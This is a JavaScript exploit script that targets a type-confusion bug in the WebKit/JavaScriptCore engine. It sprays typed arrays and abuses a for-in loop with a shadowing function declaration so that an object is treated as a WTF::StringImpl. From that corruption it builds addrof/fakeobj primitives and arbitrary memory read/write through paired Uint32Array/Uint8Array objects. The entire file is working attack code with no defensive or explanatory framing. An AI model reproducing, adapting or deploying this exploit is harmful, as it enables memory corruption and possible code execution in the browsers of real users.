// For the addrof and fakeobj primitives
var leaker_obj = { a: 0 };
var leaker_arr = new Uint32Array(6);

// For the arbitrary read and write
var oob_slave = new Uint8Array(1024);
var oob_master = new Uint32Array(7);

let spray_nogc = [];

// spray Uint32Arrays
for (let i = 0; i < 0x10000; i++) {
  let x = new Uint32Array(1);
  x[i + "spray"] = 123;
  spray_nogc.push(x);
}

//
// For debugging purposes

function print(e) {
  document.getElementById("msgs").innerHTML += "<h4>" + e + "</h4>";
}

// What the target object in memory looks like.
// 5678 is the length.
let target = {
  a: 2.1100820415101592e-303,
  b: false,
  c: true,
  d: 5678,
};

var impl_idx = 0;

//
// Creates a new object whose type-confused with
// WTF::StringImpl and returns it

function create_impl() {
  // Struct member (a) is type-confused with
  // WTF::StringImplShape::m_hashAndFlags
  let ans = { a: target };

  for (let i = 0; i < 32; i++) {
    ans[impl_idx++ + "x"] = {};
  }

  return ans;
}

function trigger(x) {
  if (impl.a != target) {
    print("wtf?");
    while (1);
  }
  // Struct member (a) is type-confused with
  // WTF::String::m_impl
  var o = { a: 1 };
  for (var i in o) {
    {
      i = x;
      function i() {}
    }
    // This line sets 4th bit (|= 16) in
    // WTF::StringImplShape::m_hashAndFlags
    o[i];
  }
  if (impl.a != target) {
    print("corrupted!");
    print(typeof impl.a); //object
    print(impl.a.length); //5678
    target.c = leaker_obj;
    leaker_obj.a = leaker_obj;
    var l1 = impl.a[4];
    var l2 = impl.a[5];
    leaker_obj.a = oob_slave;
    var s1 = impl.a[4];
    var s2 = impl.a[5];
    target.c = leaker_arr;
    impl.a[4] = l1;
    impl.a[5] = l2;
    target.c = oob_master;
    impl.a[4] = s1;
    impl.a[5] = s2;
    impl.a = target;
    print([l1, l2, s1, s2]);
    throw "exploit fucking finished";
  }
}

try {
  for (let _ = 0; _ < 1024; _++) {
    // JSString::toIdentifier checks some bits in the
    // type-confused structure ID created by the
    // create_impl function, so iterate over those
    var impl = create_impl();
    trigger({ a: impl });
  }
} catch (e) {
  print(e);
}
